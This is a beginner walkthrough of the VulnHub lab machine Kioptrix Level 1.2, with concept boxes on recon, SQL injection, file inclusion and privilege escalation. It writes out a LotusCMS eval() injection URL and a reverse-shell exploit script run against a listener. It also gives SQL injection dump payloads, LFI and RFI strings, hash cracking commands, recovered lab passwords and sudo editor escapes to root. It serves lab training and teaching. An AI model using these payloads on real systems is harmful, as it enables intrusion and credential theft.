# Kioptrix: Level 1.2 (#3) — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
|---|---|
| **Machine** | Kioptrix: Level 1.2 (#3) |
| **Difficulty** | Easy |
| **Author** | loneferret (Kioptrix) |
| **Released** | April 18, 2011 |
| **VulnHub Entry** | [Kioptrix: Level 1.2 (#3) on VulnHub](https://vulnhub.com/entry/kioptrix-level-12-3,24/) |
| **Download** | [Kioptrix: Level 1.2 (#3) OVA](https://vulnhub.com/entry/kioptrix-level-12-3,24/#download) |
| **Attacker** | Kali Linux (attacker IP `192.168.56.10`, target IP `192.168.56.101`) |
| **Target OS** | Linux (Ubuntu, PHP web app "LigGoat" / LotusCMS + Gallarific) |

> **Important setup step:** the author instructs you to point `kioptrix3.com` at the VM's IP. Add a line to your hosts file **on Kali**:
>
> ```bash
> echo "192.168.56.101 kioptrix3.com" | sudo tee -a /etc/hosts
> ```
>
> The web app uses virtual-host/redirect logic that behaves best when you browse it by name. This guide uses `192.168.56.101` in commands and `kioptrix3.com` in browser URLs.

## 0. What you will learn

- **Enumeration of a LAMP web app:** Apache + PHP + MySQL and its directory structure.
- **Authentication bypass by SQL injection:** Logging in with `' OR '1'='1`-style payloads.
- **Union-based SQL injection:** Extracting usernames/passwords from a database with `UNION SELECT`.
- **Local File Inclusion (LFI):** Reading arbitrary files (like `/etc/passwd`) through a `?system=` parameter.
- **Remote Code Execution via a vulnerable CMS:** The LotusCMS 3.0 `eval()` bug.
- **Credential discovery & cracking:** Reading MySQL creds from a config file and cracking MD5 hashes.
- **Privilege escalation via sudo + a setuid editor (`ht`):** Editing `/etc/sudoers` to become root.
- **Defensive thinking:** Blue-team lessons about CMS patching, config secrets, and dangerous sudo rules.

## 1. Reconnaissance — finding the target


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --localnet
```

> **How to read it:** Lists live hosts on your lab subnet. The Kioptrix VM is the non-Kali entry. Note its IP (example: `192.168.56.101`).


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
nmap -sn 192.168.56.0/24
```

> **How to read it:** `-sn` is a host-discovery sweep. Confirm the target responds before scanning ports.

Remember to set up name resolution (see the box at the top): add `192.168.56.101 kioptrix3.com` to `/etc/hosts`.

![host discovery](images/01-recon-netdiscover.png)


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Port and service scan

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 22,80,139,445,3306 -oA scans/services 192.168.56.101
```

> **How to read it:** The first command finds every open TCP port; the second fingerprints the interesting ones. `-sC` runs default scripts (useful banner-grabbers), `-sV` gets versions.

### 2.2 Realistic expected output

Exact banners vary by build, but expect roughly:

```text
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 4.7p1 (protocol 2.0)
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.4 with Suhosin-Patch)
139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: MYGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: MYGROUP)
3306/tcp open  mysql       MySQL 5.0.51a
```

> **How to read it:** A classic **LAMP** box: Apache + PHP on port 80, MySQL 5.0.51a, plus SMB. The web app is our way in.

### 2.3 Directory/content discovery


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
feroxbuster -u http://kioptrix3.com/ -w /usr/share/wordlists/dirb/common.txt
```

or

```bash
gobuster dir -u http://kioptrix3.com/ -w /usr/share/wordlists/dirb/common.txt
```

> **How to read it:** These brute-force common paths. Look for `/phpmyadmin`, `/gallery`, `/gadmin`, and any backup/config files. `phpMyAdmin` presence tells us a MySQL database backs the site.

**Browse the site:**

```bash
firefox http://kioptrix3.com/ &
```

You will see a "LigGoat Security" site with a **login page** that advertises **LotusCMS**. There is also a **gallery** (a "Gallarific" photo gallery).

> **How to read it:** Two applications, two potential bug classes: the CMS login (SQLi / CMS RCE) and the gallery (SQLi). Any one of them can start the chain.

![nmap and directory scan](images/02-nmap.png)

## 3. Foothold

There are **several legitimate paths** here — that is by design (the author says so). Below are the three most common, all beginner-relevant.

### 3.1 Option A — LotusCMS 3.0 `eval()` Remote Code Execution

LotusCMS 3.0 passes the `page` parameter into PHP's `eval()`, which evaluates a string **as code**. If we can inject PHP, our code runs.

**Research it first (on Kali):**


> ### 📖 Concept — CVEs, Exploit-DB and searchsploit
>
> **The identifiers:**
> - **CVE** — a stable ID for one vulnerability. `CVE-2014-6271` is Shellshock.
>   Look it up at <https://nvd.nist.gov/vuln/search>.
> - **CVSS** — a 0.0–10.0 severity score. Useful for *prioritising*, **not** for
>   deciding exploitability: a CVSS 9.8 needing physical access is less useful to you
>   than a 5.3 reachable over HTTP.
> - **EDB ID** — a numbered public proof-of-concept on Exploit-DB.
>
> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive shipped
> with Kali. Offline matters — it works mid-engagement with no internet.
>
> ```bash
> searchsploit wordpress 4.8            # search titles and paths
> searchsploit -t apache 2.4            # titles only — far fewer false positives
> searchsploit -m php/webapps/37596.py  # mirror (copy) it into your cwd
> searchsploit -x php/webapps/41006.txt # examine (print) it
> searchsploit -p 41006                 # show the full path
> searchsploit --update                 # refresh the local database
> ```
>
> > **Read the exploit before you run it.** Non-negotiable, for three reasons:
> > (1) many Exploit-DB entries are *unverified*, and some are outright malicious to
> > the person running them; (2) you need to know which parameters to change
> > (`RHOST`, `LHOST`, target path, memory offsets); (3) understanding it is the
> > entire point of the exercise.
>
> The workflow that actually works: get an exact **version** from `nmap -sV` or the
> app's own footer, search it, read the top candidate, then reproduce the request
> **by hand with `curl`** so you know what exploitation looked like. Only then decide
> whether the automated module is worth it.
>
> **Deep dive:** [CONCEPTS §11 — Finding and using exploits](../../docs/CONCEPTS.md#11-finding-and-using-exploits)

```bash
searchsploit lotuscms
```

Example output:

```text
LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit) | php/remote/18565.rb
LotusCMS 3.0.3 - Multiple Vulnerabilities                       | php/webapps/16982.txt
```

> **How to read it:** EDB **18565** is the Metasploit module; EDB **16982** documents the underlying multiple vulnerabilities. The core idea: break out of the `eval()` context and run your own PHP.

**Manual proof (URL parameter):** visit something like


> ### 📖 Concept — What is Local File Inclusion?
>
> **LFI** happens when a script passes a user-controlled path to `include()`,
> `require()` or a file-read function without validating it:
>
> ```php
> <?php include($_GET['page']); ?>     // you control a filesystem path
> ```
>
> Now you can read anything the web-server user can read:
>
> ```text
> ?page=/etc/passwd
> ?page=../../../../etc/passwd
> ?page=/var/log/apache2/access.log        # log poisoning
> ?page=/proc/self/environ
> ?page=/var/lib/php/sessions/sess_<your PHPSESSID>
> ```
>
> **The wrapper to memorise is `php://filter`** — it returns the file **base64-encoded
> instead of executing it**, so you can read PHP *source*:
>
> ```text
> ?page=php://filter/convert.base64-encode/resource=index.php
> ```
>
> That is how you recover `wp-config.php`, `configuration.php`, `.env` and
> `config/database.php` — i.e. the database credentials.
>
> **LFI alone only reads.** To get code execution you must make the target *write* a
> file you control somewhere predictable, then include it. The usual primitives: an
> **NFS export**, session files, **log poisoning** (inject PHP through a crafted
> `User-Agent`, then include the access log), or `/proc/self/environ`.
>
> **RFI** (`?page=http://attacker/shell.txt`) is the remote version and requires
> `allow_url_include=1` in `php.ini` — off by default since PHP 5.2. When it fails the
> error usually says `http:// wrapper is disabled`, which tells you to switch to LFI
> plus a local write.
>
> **Deep dive:** [CONCEPTS §13.2 — LFI](../../docs/CONCEPTS.md#132-local-file-inclusion-lfi) ·
> [§13.3 — RFI](../../docs/CONCEPTS.md#133-remote-file-inclusion-rfi)

```text
http://kioptrix3.com/index.php?page=index');phpinfo();//
```

> **How to read it:** `');` closes the CMS's own code and `phpinfo();` is our injected PHP. If a `phpinfo()` page appears, code execution is confirmed. From there, swap `phpinfo();` for a reverse shell.

**Stand-alone (no Metasploit) route:** a popular community script compiles this into a menu-driven exploit:

```bash
git clone https://github.com/Hood3dRob1n/LotusCMS-Exploit
cd LotusCMS-Exploit
chmod +x lotusRCE.sh
./lotusRCE.sh kioptrix3.com /
```

> **How to read it:** The script checks that the target is vulnerable, then asks for your **IP** and **port** and a payload method (e.g. `nc -e`). Start a listener first:
>
> ```bash
> nc -lvnp 4444
> ```
>
> When it succeeds you get a shell as **`www-data`**.

> **Metasploit alternative:** `use exploit/multi/http/lcms_php_exec`, set `RHOSTS`, `LHOST`, `LPORT`, `URI /`, then `run`.

**Confirm and upgrade the shell:**


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
id
python -c 'import pty; pty.spawn("/bin/bash")'
```

Expected `id`:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **How to read it:** `www-data` is the web server account — low privileged. The `python` line upgrades to a proper TTY.

### 3.2 Option B — Union-based SQL injection in the gallery

The gallery sorts photos by a parameter (`gallery.php?id=1&sort=photoid`). That `id`/`sort` is injectable. The classic public payload (EDB 15891) uses `UNION SELECT` to dump the `gallarific_users` table:

```text
http://kioptrix3.com/gallery/gallery.php?id=null+and+1=2+union+select+1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6+from+gallarific_users--
```

> **How to read it:** `and 1=2` forces the original query to return nothing so our `UNION SELECT` rows are what display. `group_concat(...)` collapses the admin row into one string. You should see an admin username/password in plain text (commonly `admin : n0t7t1k4`).

**Automate with sqlmap (optional):**


> ### 📖 Concept — What is SQL injection?
>
> The application builds a query by **concatenating your input**:
>
> ```php
> $q = "SELECT * FROM users WHERE user='".$_POST['u']."' AND pass='".$_POST['p']."'";
> ```
>
> Supply `admin' -- ` and it becomes:
>
> ```sql
> SELECT * FROM users WHERE user='admin' -- ' AND pass='whatever'
> ```
>
> `-- ` starts a SQL comment (**the trailing space is required in MySQL**), so the
> password check is deleted and you are logged in as admin with no password. Your
> input escaped the *data* context and became *code*.
>
> **Detect it** by inserting `'`, `"`, `` ` ``, `)` or `--` and watching for a database
> error, a changed page length, or a different status code.
>
> **Payload shapes:**
>
> ```text
> ' OR 1=1 --                        tautology
> ' OR '1'='1                        string-context tautology
> 1' UNION SELECT 1,2,3 --           find the column count, then extract data
> 1' UNION SELECT user_login,user_pass,3 FROM wp_users --
> '; WAITFOR DELAY '0:0:5' --        blind/time-based confirmation
> ```
>
> ```bash
> sqlmap -u "http://target/page.php?id=1" --dbs
> sqlmap -u "http://target/page.php?id=1" -D wordpress -T wp_users --dump
> sqlmap -r request.txt --batch --level 3 --risk 2      # from a saved Burp request
> ```
>
> > **`sqlmap` is a tool, not a substitute for understanding.** When it fails the
> > reason is usually that you have not told it *where* the injectable parameter is,
> > that authentication is needed (`--cookie=`), or that the injection is
> > second-order. Confirm manually with a `'` first — it takes ten seconds and tells
> > you whether sqlmap has anything to work with.
>
> The fix is always the same: **prepared statements / bound parameters**, never string
> concatenation.
>
> **Deep dive:** [CONCEPTS §13.1 — SQL injection](../../docs/CONCEPTS.md#131-sql-injection-sqli)

```bash
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid" -p id,sort --dbms=mysql --dbs
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid" -p id,sort -D gallery -T gallarific_users --dump
```

> **How to read it:** `--dbs` lists databases; `-D gallery -T gallarific_users --dump` extracts that table. The `gallarific_users` admin password is stored in **plain text** — a serious app flaw.

### 3.3 Option C — Local File Inclusion (LFI)

The blog/login page renders content from a `system=` parameter:

```text
http://kioptrix3.com/index.php?system=../../../../../../etc/passwd%00.html
```

> **How to read it:** `../` climbs directories; `%00` is a **null byte** that truncates the trailing `.html` the app appends. If you see the contents of `/etc/passwd`, the page is including arbitrary local files. This reveals valid usernames like `loneferret` and `dreg`.

**Bonus — combine LFI + gallery upload into RCE:** the gallery exposes a hidden `/gadmin` admin area (its link is commented out in the page source). Log in with the admin creds from Option B, upload a PHP shell disguised as an image (e.g. `shell.jpg`), then trigger it through the LFI:

```text
http://kioptrix3.com/index.php?system=../../../../../../home/www/kioptrix3.com/gallery/photos/<your-uploaded-file>.jpg%00.html&cmd=id
```

> **How to read it:** The uploaded "image" is valid enough to be stored, but its `.jpg` content is actually PHP. The LFI includes the file, PHP executes it, and `cmd=id` runs your command. This is the "file upload + LFI = RCE" chain.
> **Why it works:** The app trusts the file extension for storage but *executes* whatever is included — a classic "content/extension mismatch."

![LotusCMS login and shell](images/03-foothold.png)


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

### 4.1 Find database credentials in a config file

As `www-data`, read the web app's config (exact path may vary by build):

```bash
grep -RniE "password|pass|mysql" /home/www/kioptrix3.com/gallery/gconfig.php 2>/dev/null
cat /home/www/kioptrix3.com/gallery/gconfig.php
```

> **How to read it:** Config files often hard-code secrets. Here you typically find the MySQL **root** account and its password (community writeups report it as `fuckeyou` on the standard build).

### 4.2 Read the user table

```bash
mysql -u root -p
# enter the password from gconfig.php (e.g. fuckeyou)
```

Then inside the MySQL prompt:

```sql
SHOW DATABASES;
USE gallery;
SELECT * FROM dev_accounts;
```

Example output:

```text
+----+------------+----------------------------------+
| id | username   | password                         |
+----+------------+----------------------------------+
|  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 |
|  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e |
+----+---------------------------------------------------+
```

> **How to read it:** The `password` values are **32-character MD5 hashes**. These are fast to crack.

### 4.3 Crack the hashes


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)
> ### 📖 Concept — How password cracking actually works
>
> A password hash is a **one-way** function. You cannot invert it — there is no
> "un-hash". You can only **guess and compare**: hash a candidate, see if it matches
> the target. Cracking speed is therefore measured in guesses per second, and the
> defence is to make each guess expensive.
>
> | Algorithm | GPU speed | Verdict |
> | --- | --- | --- |
> | MD5, SHA-1, SHA-256 | **Billions/sec** | Unusable for passwords |
> | MD5-crypt (`$1$`) | ~100k/sec | Obsolete |
> | bcrypt (`$2b$`) | ~20k/sec | Acceptable |
> | SHA-512-crypt (`$6$`) | ~10k/sec | Acceptable |
> | **phpass (`$P$`)** | ~5k/sec | WordPress/Drupal — 8192 MD5 rounds, deliberately slow |
> | yescrypt (`$y$`) | ~3k/sec | Modern Ubuntu default |
>
> ```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> john --show hash.txt                       # results without re-cracking
> john --format=phpass --wordlist=rockyou.txt hash.txt    # force the format
> unshadow /etc/passwd /etc/shadow > combined.txt         # prepare Linux hashes
> hashcat -m 400 -a 0 hash.txt rockyou.txt                # -m = mode, -a 0 = wordlist
> ```
>
> **Reading John's output:** `Loaded 1 password hash (phpass, …)` means it
> auto-detected the format correctly — if it says `No password hashes loaded`, pass
> `--format=` explicitly (`john --list=formats` lists them all). `1g 0:00:00:14 DONE`
> means one guess succeeded in 14 seconds, and `3842p/s` is the candidate rate — **that
> low number is the algorithm's defence working.**
>
> > ⚠️ **Always single-quote a hash on the command line.** In double quotes or bare,
> > the shell expands `$P`, `$1`, `$6` as variables and silently truncates it. This is
> > one of the most common reasons a crack "finds nothing".
>
> **If the wordlist fails, add rules before giving up** — automatic mangling that
> capitalises, appends digits and applies leetspeak:
>
> ```bash
> john --wordlist=rockyou.txt --rules hash.txt
> hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> ```
>
> `best64.rule` applies 64 transformations per word. A list that fails outright very
> often succeeds with rules, at 64× the cost.
>
> **Deep dive:** [CONCEPTS §14 — Password cracking](../../docs/CONCEPTS.md#14-password-cracking)

```bash
echo '0d3eccfb887aabd50f243b3f155c0f85' > hashes.txt
echo '5badcaf789d3d1d09794d8f021f40f0e' >> hashes.txt
hashcat -a 0 -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --show
```

> **How to read it:** `-m 0` selects raw MD5. `--show` prints already-cracked pairs. Community writeups report the plaintexts as **`Mast3r`** (`dreg`) and **`starwars`** (`loneferret`). (Use `john` instead of `hashcat` if you prefer.)

### 4.4 SSH in as `loneferret`

```bash
ssh loneferret@192.168.56.101
# password: starwars
```

> **How to read it:** Users reuse passwords. The database hash cracked to the same password used for the system account.

### 4.5 Escalate via sudo + the `ht` editor

Check what the user is allowed to run as root:


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
sudo -l
```

Example output:

```text
User loneferret may run the following commands on this host:
    (root) NOPASSWD: /usr/local/bin/ht
```

> **How to read it:** `loneferret` can run the **`ht` editor** as `root` with **no password** (`NOPASSWD`). A text editor running as root can edit *any* file — including `/etc/sudoers`.

Run it (set the terminal type first, or `ht` may complain about `xterm-256color`):

```bash
export TERM=xterm
sudo ht
```

Inside `ht`:
1. Press **F3** (or use the File menu, often **Alt+F**) and open `/etc/sudoers`.
2. Find the `loneferret` line and add `ALL=(ALL) ALL` (or grant `/bin/su`).
3. Save (often **F2**) and quit.

Then:

```bash
sudo su
```

```text
root@Kioptrix3:/home/loneferret# whoami
root
```

> **How to read it:** `sudo su` now succeeds because we granted ourselves full sudo rights. `whoami` returns `root`.
> **Alternative root routes:** (a) the `ht` editor can open `/etc/shadow` to read the root hash, or (b) since we can edit `/etc/passwd`, add a new UID-0 user with an `openssl passwd -1` hash and `su` to it.

**Read the proof file:**

```bash
cat /root/Congrats.txt
```

> **How to read it:** The root directory contains a congratulatory file rather than a flag. The win is a root shell.

![sudo ht and root](images/04-root-escalation.png)

## 5. Summary of vulnerabilities

| Vulnerability | CVE | Affected Component | Port(s) | Impact | Notes |
|---|---|---|---|---|---|
| LotusCMS 3.0 `eval()` code injection | See EDB 18565 / 16982 | LotusCMS 3.0 (`page` parameter) | 80 (HTTP) | Remote Code Execution as `www-data` | PHP `eval()` on unsanitized input. |
| Union-based SQL injection | N/A (design flaw) | Gallarific gallery (`gallery.php`) | 80 (HTTP) | Database read (plain-text admin creds) | `id`/`sort` parameters injectable. |
| Local File Inclusion | N/A (design flaw) | `index.php?system=` | 80 (HTTP) | Arbitrary file read → RCE with upload | Null-byte truncation bypasses appended suffix. |
| Hidden admin area + unrestricted upload | N/A (design flaw) | Gallarific `/gadmin` | 80 (HTTP) | Upload of PHP code | Admin link only "hidden," not removed. |
| Hard-coded DB credentials in config | N/A (misconfiguration) | `gallery/gconfig.php` | filesystem | MySQL root access | Secrets in cleartext in a web-readable file. |
| Weak password hashing + reuse | N/A (weakness) | `dev_accounts` MD5 hashes | filesystem / 22 | Credential cracking → SSH | Unsalted MD5; same password reused for SSH. |
